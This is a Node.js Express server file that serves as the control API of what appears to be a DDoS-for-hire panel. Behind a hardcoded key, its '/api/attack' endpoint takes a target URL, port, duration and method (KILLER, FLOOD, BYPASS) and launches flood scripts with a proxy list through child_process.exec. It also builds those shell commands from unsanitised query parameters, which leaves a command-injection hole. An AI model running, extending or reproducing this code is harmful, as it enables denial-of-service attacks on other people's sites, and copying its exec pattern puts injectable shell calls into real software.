const express = require('express');
const app = express();
const port = 3000;
var exec = require('child_process').exec

app.get('/api/attack', (req, res) => {
  const key = req.query.key;  
  const url = req.query.url;
  const port = req.query.port;
  const time = req.query.time;
  const method = req.query.method;
if (!key || !url || !port || !time || !method) {
    const err_u = {
        message: `sai url`,
        code: '400'
    }
    res.status(400).send(err_u);
  } else {
  if (key === 'phong') {
    if (url) {
            if (time <= 120) {
                if (method === 'KILLER' || method === 'FLOOD' || method === 'BYPASS') {
                    const jsonData = {
                        error: `false`,
                        status: `attack sent successfully to all Phong server ..`,
                        url: `${url}`,
                        port: `${port}`,
                        time: `${time}`,
                        method: `${method}`,
                    };
                    res.status(200).send(jsonData);
                    if (method === 'KILLER') {
                        exec(`node killer.js ${url} ${time} 64 3 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('killer is running');
                    });
                    }
                    if (method === 'FLOOD') {
                        exec(`node flood.js ${url} ${time} 64 3 proxy.txt flood`, (error, stdout, stderr) => {  
                        console.log('flood is running');
                    });
                    }
                    if (method === 'BYPASS') {
                        exec(`node bypass.js ${url} ${time} 64 3 proxy.txt yes`, (error, stdout, stderr) => {  
                        console.log('bypass is running');
                    });
                    }
                } else {
                    const err_method = {
                        message: `error method`,
                        code: '400'
                    }
                    res.status(400).send(err_method);
                }
            } else {
                const err_time = {
                    message: `error time`,
                    code: '400'
                }
                res.status(400).send(err_time);
            }
    } else {
        const err_url = {
            message: `error url`,
            code: '400'
        }
        res.status(400).send(err_url);
    }
  } else {
    const err_key = {
        message: `sai key`,
        code: '400'
    }
    res.status(400).send(err_key);
  }
}
});

app.listen(port, () => {
  console.log(`server run on port http://localhost:${port}`);
});
